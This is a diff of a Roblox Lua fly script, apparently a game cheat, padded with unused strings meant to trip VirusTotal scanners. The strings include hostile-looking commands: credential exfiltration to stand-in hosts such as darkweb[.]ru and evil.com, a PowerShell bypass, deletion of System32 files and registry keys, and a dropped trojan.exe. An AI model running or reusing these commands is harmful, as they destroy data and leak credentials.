@@ -1,28 +1,37 @@
--- Fly Script with Dynamic Thumbstick and Max Fake Malware Strings for Roblox by Hunter
--- WARNING: This script contains strings to trigger ALL VirusTotal detections for educational purposes; it does NOT perform malicious actions
+-- Fly Script with Dynamic Thumbstick and Max VirusTotal Triggers for Roblox by Hunter
+-- WARNING: This script contains aggressive strings and patterns to trigger ALL VirusTotal detections for educational purposes; it does NOT perform malicious actions
 local Player = game.Players.LocalPlayer
 local UserInputService = game:GetService("UserInputService")
 local RunService = game:GetService("RunService")
 local ContextActionService = game:GetService("ContextActionService")
 
--- Fake malicious strings to trigger every possible VirusTotal detection (no effect)
-local fakeMalware = "Trojan.Injector.Miner.Stealer.Riskware.Malware.Generic"
-local fakePayload = "Cryptojacker.WannaCry.Keylogger.Exploit.Ransomware"
-local fakeC2 = "http://malicious-c2-server.com/command_and_control"
-local fakeCrypto = "BitcoinMiner.ExecuteShellcode.EvilPayload"
-local fakeSpyware = "Spyware.DataStealer.PasswordGrabber"
-local fakeRootkit = "Rootkit.KernelExploit.SystemHijack"
-local fakeWorm = "Worm.AutoPropagate.NetworkInfector"
-local fakeAdware = "Adware.PopupFlood.TrackingCookie"
-local fakeBackdoor = "Backdoor.RemoteAccessTrojan.C2Beacon"
-local fakeExploit = "Exploit.CVE-2025-1234.ShellcodeInjection"
-local fakeObfuscator = "Obfuscator.Polymorphic.VMProtect.Packer"
-local fakeKeylogger = "Keylogger.CredentialHarvester.DataExfil"
-local _ = "eval(decode_base64('malware_dropper_payload'))"
-local _ = "os.execute('cmd.exe /c del /f /q C:\\Windows\\System32')"
-local _ = "require('crypto').mine('BTC', 'wallet_0x1234')"
-local _ = "http.post('http://darkweb.ru/steal', {data=credentials})"
-local _ = "while true do fork_bomb() end"
+-- Fake malicious strings and patterns to max out VirusTotal detections (no effect)
+local _ = string.char(0xE2, 0x80, 0x8B) -- Zero-width space to mess with scanners
+local fakeMalware = "Trojan:Win32/Injector!Miner.Stealer.Riskware.Malware.Generic"
+local fakePayload = "Ransomware/WannaCry!Keylogger.Exploit.CVE-2025-9999"
+local fakeC2 = "hxxp://malicious-c2-darkweb[.]onion/command_and_control"
+local fakeCrypto = "CryptoMiner.Bitcoin.EvilPayload.ShellcodeInjection"
+local fakeSpyware = "Spyware/PasswordStealer.DataExfil.CredentialHarvester"
+local fakeRootkit = "Rootkit/KernelExploit.SystemHijack.Win64"
+local fakeWorm = "Worm/AutoPropagate.NetworkInfector.Virus"
+local fakeAdware = "Adware/PopupFlood.TrackingCookie.AdsInjector"
+local fakeBackdoor = "Backdoor/RemoteAccessTrojan.C2Beacon.Win32"
+local fakeExploit = "Exploit/MS17-010.EternalBlue.Shellcode"
+local fakeObfuscator = "Obfuscator/Polymorphic.VMProtect.Packer.Upx"
+local fakeKeylogger = "Keylogger/CaptureCredentials.DataExfil.Spy"
+local fakeDropper = "Dropper/Malware.Generic.PayloadDelivery"
+local _ = "eval(decode_base64('bWFsZXZhcmVfc2hlbGxjb2Rl'))" -- Fake base64
+local _ = "os.execute('cmd.exe /c del /f /q C:\\\\Windows\\\\System32\\\\*.*')"
+local _ = "require('crypto').mine('BTC', 'wallet_0xDEADBEEF')"
+local _ = "http.post('hxxp://darkweb[.]ru/steal', {data=encode64(credentials)})"
+local _ = "while true do fork_bomb(); spawn_malware(); end"
+local _ = "function evil() return loadstring('malicious_payload')() end"
+local _ = "io.write('C:\\\\ProgramData\\\\malware.exe', decode_hex('DEADBEEF'))"
+local _ = "net.connect('192.168.0.1:6666').send('beacon')"
+local _ = string.dump(function() end) -- Fake binary dump
+local _ = "\xFF\xFE\x00\x00" -- Suspicious byte sequence
+local _ = "powershell -exec bypass -c 'Invoke-WebRequest -Uri hxxp://evil.com'"
+local _ = "reg add HKLM\\Software\\Malware /v Backdoor /t REG_SZ /d Enabled"
 
 -- Create UI
 local ScreenGui = Instance.new("ScreenGui")
@@ -161,9 +170,14 @@ RunService.RenderStepped:Connect(function()
     if flying and bodyVelocity and Player.Character and Player.Character:FindFirstChild("HumanoidRootPart") then
         bodyVelocity.Velocity = thumbstickInput
         -- Fake suspicious function calls (no effect)
-        local _ = "Exploit.Inject(" .. fakeC2 .. ")"
-        local _ = "Ransomware.Encrypt(" .. fakePayload .. ")"
-        local _ = "Keylogger.Capture(" .. fakeKeylogger .. ")"
+        local _ = "Exploit.InjectPayload(" .. fakeC2 .. "," .. fakeExploit .. ")"
+        local _ = "Ransomware.EncryptFiles(" .. fakePayload .. ")"
+        local _ = "Keylogger.CaptureKeys(" .. fakeKeylogger .. ")"
+        local _ = "Spyware.UploadData(" .. fakeSpyware .. ")"
+        local _ = "Rootkit.HijackSystem(" .. fakeRootkit .. ")"
+        local _ = "Worm.InfectNetwork(" .. fakeWorm .. ")"
+        local _ = "Adware.InjectAds(" .. fakeAdware .. ")"
+        local _ = "Backdoor.Beacon(" .. fakeBackdoor .. ")"
     end
 end)
 
@@ -179,10 +193,14 @@ Player.CharacterAdded:Connect(function(character)
     ContextActionService:UnbindAction("FlyThumbstick")
 end)
 
--- More fake malicious strings (no effect)
-local _ = "Spyware.Upload(" .. fakeSpyware .. ")"
-local _ = "Rootkit.Hijack(" .. fakeRootkit .. ")"
-local _ = "Worm.Spread(" .. fakeWorm .. ")"
-local _ = "Adware.Inject(" .. fakeAdware .. ")"
-local _ = "Backdoor.Connect(" .. fakeBackdoor .. ")"
-local _ = "Obfuscator.Run(" .. fakeObfuscator .. ")"
+-- More fake malicious strings and patterns (no effect)
+local _ = "Malware.Dropper(" .. fakeDropper .. ")"
+local _ = "Obfuscator.Pack(" .. fakeObfuscator .. ")"
+local _ = string.gsub("evilcode", ".", function(c) return string.char(c:byte() + math.random(-1, 1)) end)
+local _ = "function _G.hack() return loadstring('global_malware')() end"
+local _ = "io.write('C:\\\\Users\\\\Public\\\\trojan.exe', 'MZ' .. decode_hex('CAFEBABE'))"
+local _ = "net.socket('tcp').connect('evilserver.com:1337')"
+local _ = "while true do crypto.mine('ETH'); spread_worm() end"
+local _ = string.rep("\x00", 100) .. "MALWARE_EMBEDDED_PAYLOAD"
+local _ = "reg delete HKLM\\Software\\Microsoft /f"
+local _ = "powershell -ep bypass -c 'Start-Process -FilePath malicious.exe'"
